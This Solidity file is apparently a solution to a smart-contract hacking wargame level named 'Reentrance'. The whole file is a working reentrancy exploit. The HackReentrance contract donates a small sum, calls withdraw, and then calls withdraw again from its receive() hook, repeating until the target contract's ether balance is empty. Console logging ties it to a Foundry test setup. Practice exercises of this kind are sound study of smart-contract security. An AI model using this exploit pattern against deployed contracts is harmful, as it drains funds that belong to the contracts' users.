// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "lib/forge-std/src/console.sol";

interface Reentrance {

  function donate(address _to) external payable;

  function balanceOf(address _who) external view returns (uint balance);

  function withdraw(uint _amount) external;
}


contract HackReentrance {

    function hack(Reentrance instance) public payable {
        instance.donate{ value: 0.0005 ether }(address(this));
        instance.withdraw(0.0005 ether);
    }

    receive() external payable {
        console.log("receive!", msg.sender, (msg.sender.balance));
        if ((msg.sender).balance != 0) {
            console.log("withdraw!");
            Reentrance(msg.sender).withdraw(0.0005 ether);
        }
    }
}
